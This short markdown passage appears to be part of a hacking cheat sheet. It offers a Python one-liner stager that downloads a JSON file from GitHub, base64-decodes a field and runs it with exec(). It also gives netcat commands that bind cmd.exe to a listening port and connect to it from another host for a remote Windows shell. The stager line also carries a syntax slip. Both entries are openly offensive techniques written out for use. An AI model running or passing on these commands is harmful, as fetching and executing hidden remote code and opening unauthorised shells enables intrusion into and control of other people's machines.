


#### Execute Hidden Python Command (In One Line, using base64 encoding) 
[More Info](https://null-byte.wonderhowto.com/how-to/execute-hidden-python-commands-one-line-stager-0236732/)
```
import json; import requests; import base64; data = (requests.get("https://github.com/skickar/Research/blob/master/twitter1.json")).json(); exec(base64.b64decode(data["m1]).decode('utf-8'))
```

#### Remote Shells in Windows
[More Info](https://www.youtube.com/watch?v=Op4s5e8gL0o)
```
nc --Lp 31337 --vv --e cmd.exe
nc 10.73.31.59 31337
```